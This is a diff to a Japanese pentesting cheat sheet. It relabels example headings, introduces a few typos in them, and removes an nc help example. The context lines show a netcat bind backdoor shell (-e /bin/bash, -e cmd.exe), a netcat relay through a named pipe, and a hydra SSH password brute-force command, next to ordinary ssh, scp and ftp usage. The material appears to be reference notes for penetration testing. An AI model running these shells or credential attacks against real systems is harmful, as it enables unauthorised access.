@@ -10,15 +10,11 @@
 -v：接続状態などの出力を行う
 -vv：接続状態などのより詳細な出力を行う
 ```
-ヘルプの表示：
-```console
-$nc -help
-```
-ポート1234でリッスン：
+実行例(ポート1234でリッスン)：
 ```console
 $ncat -nlv 1234
 ```
-Backdoor Shell：
+実行例(Backdoor Shell)
 ```console
 $nc -l -p [port] -e /bin/bash
 ```
@@ -26,7 +22,7 @@ OR
 ```console
 C:\>nc [port] -e cmd.exe
 ```
-Netcat Relays(Listener-to-Listner)：
+実行例(Ntcat Relays(Listener-to-Listner))
 ```console
 $cd /tmp
 $mknod backpipe p
@@ -40,7 +36,7 @@ $nc -l -p [port] 0<backpipe | nc -l -p [port] | tee backpipe
 -vv：デバッグのより詳細な出力
 -vvv："-vv"より更に詳細な出力
 ```
-ターゲットのユーザに対してSSHで接続：
+実行例(ーゲットのユーザに対してSSHで接続)
 ```console
 $ssh user@[target(ip/hostname)]
 ```
@@ -54,11 +50,11 @@ $ssh user@[target(ip/hostname)]
 *.txt：ワイルドカード
 /home/user/{file1,file2,file3}：ファイルの複数選択 
 ```
-リモートホストからローカルにコピーする
+実行例(モートホストからローカルにコピーする)：
 ```console
 $scp user@[target(ip/hostname)]:[remote_filepath] [local_filepath]
 ```
-ローカルからリモートホストにコピーする
+実行例(ローカルからリモートホストにコピーする)
 ```console
 $scp [local_filepath] user@[target(ip/hostname)]:[remote_filepath]
 ```
@@ -67,15 +63,15 @@ $scp [local_filepath] user@[target(ip/hostname)]:[remote_filepath]
 ```
 -s:filename ：接続時にスクリプトを実行する
 ```
-ターゲットに接続：
+実行例(ターゲットに接続)：
 ```console
 $ftp [target(ip/hostname)]
 ```
-アップロード(FTP)：
+実行例(アップロード(FTP))：
 ```console
 ftp>put [local_filepath]
 ```
-ダウンロード(FTP)：
+実行例(ダウンロード(FTP))：
 ```console
 ftp>get [remote_filepath]
 ```
@@ -91,7 +87,7 @@ ftp>get [remote_filepath]
 -v：詳細な出力
 services: サービスの指定/対応サービス(asterisk afp cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql ncp nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp)
 ```
-実行例：
+実行例(sshパスクラ)：
 ```console
 $hydra -C [USERPASS_FILE] [target(ip/hostname)] ssh
 ```
